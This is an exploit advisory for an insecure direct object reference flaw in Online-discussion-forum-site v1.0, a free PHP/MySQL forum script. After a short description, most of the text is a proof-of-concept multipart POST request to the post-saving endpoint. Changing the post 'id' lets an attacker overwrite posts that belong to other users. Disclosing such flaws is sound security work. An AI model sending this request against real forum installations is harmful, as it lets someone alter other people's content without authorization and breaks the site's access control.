# Exploit Title: Online-discussion-forum-site v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Online-discussion-forum-site v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update post that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /odfs/classes/Master.php?f=save_post HTTP/1.1
...

------WebKitFormBoundaryHFCTz7bcSc9IpxCG
Content-Disposition: form-data; name="id"

6(CHANGE HERE)
------WebKitFormBoundaryHFCTz7bcSc9IpxCG
Content-Disposition: form-data; name="title"

mypost1111
------WebKitFormBoundaryHFCTz7bcSc9IpxCG
Content-Disposition: form-data; name="category_id"

1
------WebKitFormBoundaryHFCTz7bcSc9IpxCG
Content-Disposition: form-data; name="content"

<p>aaaaa</p>
------WebKitFormBoundaryHFCTz7bcSc9IpxCG
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryHFCTz7bcSc9IpxCG--

```